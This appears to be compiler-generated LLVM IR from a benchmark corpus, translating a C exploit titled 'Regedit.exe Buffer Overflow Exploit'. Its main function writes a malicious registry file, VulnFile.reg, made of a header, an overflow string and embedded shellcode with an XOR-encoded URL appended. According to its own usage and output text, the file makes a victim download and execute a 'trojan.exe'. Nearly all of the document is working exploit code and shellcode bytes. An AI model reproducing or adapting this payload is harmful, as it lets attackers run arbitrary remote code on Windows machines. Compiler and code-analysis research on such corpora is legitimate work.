; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_22366.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_22366.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.entete = private unnamed_addr constant [103 x i8] c"Windows Registry Editor Version 5.00\0D\0A\0D\0A[HKEY_LOCAL_MACHINE\\SOFTWARE\\Discovered\\and\\coded\\by\\ThreaT]\0D\0A\00", align 16
@__const.main.RealGenericShellcode = private unnamed_addr constant [307 x i8] c"\AA\C6\02\01\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90h^V\C3\90\8B\CC\FF\D1\83\C6\0E\90\8B\FE\AC4\99\AA\84\C0u\F8r\EB\F3\A9\C2\FD\12\9A\12\D9\95\12\D1\95\12X\12\C5\BD\91\12\E9\A9\9A\ED\BD\9D\A1\87\EC\D5\12\D9\81\12\C1\A5\9AA\12\C2\E1\9AA\12\EA\85\9Ai\CF\12\EA\BD\9Ai\CF\12\CA\B9\9AI\12\C2\81\D2\12\AD\03\9Ai\9A\ED\BD\8D\12\AF\A2\ED\BD\81\ED\93\D2\BAB\ECs\C1\C1\AAYZ\C6\AAP\FF\12\95\C6\C6\12\A5\16\14\9D\9EZ\12\81\12Z\A2X\EC\04Zr\E5\AAB\F1\E0\DC\E1\D8\F3\93\F3\D2\CAq\E2fff\AAP\C8\F1\EC\EB\F5\F4\FF^\DD\BD\9D\F6\F7\12u\C8\C8\CCfI\F1\F0\F5\FC\D8\F3\97\F3\EB\F3\9Bq\CCfff\AAB\CA\F1\F8\B7\FC\E1_\DD\BD\9D\FC\12U\CA\CA\C8f\EC\81\CAfI\AAB\F1\F0\F7\DC\E1\F3\98\F3\D2\CAq\B5fff\14\D5\BD\89\F3\98\C8fI\AAB\F1\E1\F0\ED\C9\F3\98\F3\D2\CAq\8BffffIq\E6fff\00", align 16
@.str = private unnamed_addr constant [200 x i8] c"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\0ARegedit.exe Buffer Overflow Exploit\0A@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\0ADiscovered & Coded By ThreaT.\0A\0Acontact : ThreaT@Ifrance.com\0AURL : http://www.chez.com/mvm\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [219 x i8] c"_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\0AUsage   : regexploit.exe <URL://trojan.exe>\0AExemple : regexploit.exe file://c:/winnt/system32/cmd.exe\0A_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\0A\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"VulnFile.reg\00", align 1
@GENERIC_WRITE = common dso_local global i32 0, align 4
@FILE_SHARE_WRITE = common dso_local global i32 0, align 4
@CREATE_ALWAYS = common dso_local global i32 0, align 4
@FILE_ATTRIBUTE_NORMAL = common dso_local global i32 0, align 4
@RegFile = common dso_local global i64 0, align 8
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [32 x i8] c"Cannot create a vuln regfile !\0A\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"\FF\FE\00", align 1
@LPTR = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [2 x i8] c"\99\00", align 1
@.str.6 = private unnamed_addr constant [99 x i8] c"un fichier .reg vulnerable appele VulnFile.reg viens d'etre cree\0Apour downloader et executer '%s'\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca [103 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [307 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %10 = bitcast [103 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([103 x i8], [103 x i8]* @__const.main.entete, i32 0, i32 0), i64 103, i1 false)
  %11 = bitcast [307 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 getelementptr inbounds ([307 x i8], [307 x i8]* @__const.main.RealGenericShellcode, i32 0, i32 0), i64 307, i1 false)
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([200 x i8], [200 x i8]* @.str, i64 0, i64 0))
  %13 = load i8**, i8*** %4, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 1
  %15 = load i8*, i8** %14, align 8
  %16 = icmp ne i8* %15, null
  br i1 %16, label %20, label %17

17:                                               ; preds = %2
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([219 x i8], [219 x i8]* @.str.1, i64 0, i64 0))
  %19 = call i32 @ExitProcess(i32 0)
  br label %20

20:                                               ; preds = %17, %2
  %21 = load i32, i32* @GENERIC_WRITE, align 4
  %22 = load i32, i32* @FILE_SHARE_WRITE, align 4
  %23 = load i32, i32* @CREATE_ALWAYS, align 4
  %24 = load i32, i32* @FILE_ATTRIBUTE_NORMAL, align 4
  %25 = call i64 @CreateFile(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0), i32 %21, i32 %22, i32* null, i32 %23, i32 %24, i32* null)
  store i64 %25, i64* @RegFile, align 8
  %26 = load i64, i64* @RegFile, align 8
  %27 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %28 = icmp eq i64 %26, %27
  br i1 %28, label %29, label %32

29:                                               ; preds = %20
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %31 = call i32 @ExitProcess(i32 0)
  br label %32

32:                                               ; preds = %29, %20
  %33 = call i32 @Write(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32 2)
  %34 = getelementptr inbounds [103 x i8], [103 x i8]* %6, i64 0, i64 0
  %35 = call i8* @ToWideChar(i8* %34)
  %36 = getelementptr inbounds [103 x i8], [103 x i8]* %6, i64 0, i64 0
  %37 = call i32 @strlen(i8* %36)
  %38 = mul nsw i32 %37, 2
  %39 = call i32 @Write(i8* %35, i32 %38)
  %40 = load i32, i32* @LPTR, align 4
  %41 = call i64 @LocalAlloc(i32 %40, i32 270)
  %42 = inttoptr i64 %41 to i8*
  store i8* %42, i8** %7, align 8
  %43 = load i8*, i8** %7, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 0
  store i8 34, i8* %44, align 1
  %45 = load i8*, i8** %7, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @memset(i8* %46, i32 48, i32 260)
  %48 = load i8*, i8** %7, align 8
  %49 = call i8* @ToWideChar(i8* %48)
  %50 = load i8*, i8** %7, align 8
  %51 = call i32 @strlen(i8* %50)
  %52 = mul nsw i32 %51, 2
  %53 = call i32 @Write(i8* %49, i32 %52)
  %54 = load i32, i32* @LPTR, align 4
  %55 = load i8**, i8*** %4, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @strlen(i8* %57)
  %59 = add nsw i32 %58, 10
  %60 = call i64 @LocalAlloc(i32 %54, i32 %59)
  %61 = inttoptr i64 %60 to i8*
  store i8* %61, i8** %8, align 8
  %62 = load i8*, i8** %8, align 8
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 1
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @lstrcpy(i8* %62, i8* %65)
  store i32 0, i32* %5, align 4
  br label %67

67:                                               ; preds = %75, %32
  %68 = load i32, i32* %5, align 4
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 1
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @strlen(i8* %71)
  %73 = icmp slt i32 %68, %72
  br i1 %73, label %74, label %87

74:                                               ; preds = %67
  br label %75

75:                                               ; preds = %74
  %76 = load i8**, i8*** %4, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 1
  %78 = load i8*, i8** %77, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %5, align 4
  %81 = sext i32 %79 to i64
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = xor i32 %84, 153
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %82, align 1
  br label %67

87:                                               ; preds = %67
  %88 = getelementptr inbounds [307 x i8], [307 x i8]* %9, i64 0, i64 0
  %89 = load i8**, i8*** %4, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 1
  %91 = load i8*, i8** %90, align 8
  %92 = call i32 @lstrcat(i8* %88, i8* %91)
  %93 = getelementptr inbounds [307 x i8], [307 x i8]* %9, i64 0, i64 0
  %94 = call i32 @lstrcat(i8* %93, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %95 = getelementptr inbounds [307 x i8], [307 x i8]* %9, i64 0, i64 0
  %96 = getelementptr inbounds [307 x i8], [307 x i8]* %9, i64 0, i64 0
  %97 = call i32 @strlen(i8* %96)
  %98 = call i32 @Write(i8* %95, i32 %97)
  %99 = load i64, i64* @RegFile, align 8
  %100 = call i32 @CloseHandle(i64 %99)
  %101 = load i8*, i8** %8, align 8
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.6, i64 0, i64 0), i8* %101)
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @ExitProcess(i32) #2

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32*) #2

declare dso_local i32 @Write(i8*, i32) #2

declare dso_local i8* @ToWideChar(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @LocalAlloc(i32, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @lstrcpy(i8*, i8*) #2

declare dso_local i32 @lstrcat(i8*, i8*) #2

declare dso_local i32 @CloseHandle(i64) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
